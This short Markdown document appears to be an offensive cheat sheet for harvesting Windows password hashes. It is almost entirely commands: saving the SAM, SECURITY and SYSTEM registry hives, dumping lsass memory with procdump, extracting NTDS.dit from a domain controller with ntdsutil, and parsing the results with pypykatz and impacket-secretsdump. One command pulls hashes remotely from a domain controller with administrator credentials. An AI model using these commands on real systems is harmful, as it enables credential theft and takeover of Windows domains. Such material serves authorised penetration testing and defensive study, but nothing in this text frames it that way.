## SAM
```cmd
reg.exe save hklm\sam %TEMP%/sam.save
reg.exe save hklm\security %TEMP%\security.save
reg.exe save hklm\system %TEMP%\system.save
```
```shell
pypykatz registry system.save --sam sam.save --security security.save
```

## lsass

dump from `task manager` or use `ProcDump.exe` from sysinternals tool
 ```
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```

```shell
pypykatz lsa minidump lsass.DMP
```


## Domain controller hashes

### without credentials
```powershell
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```
```bash
impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
impacket-secretsdump -history -system SYSTEM -security SECURITY -ntds ntds.dit local  # also show password history
```

### with credentials
If you have credentials for an account that can log on to the DC, it's possible to dump hashes from NTDS.dit remotely via RPC protocol with impacket:
```bash
impacket-secretsdump -just-dc-ntlm offense/administrator@10.0.0.6
```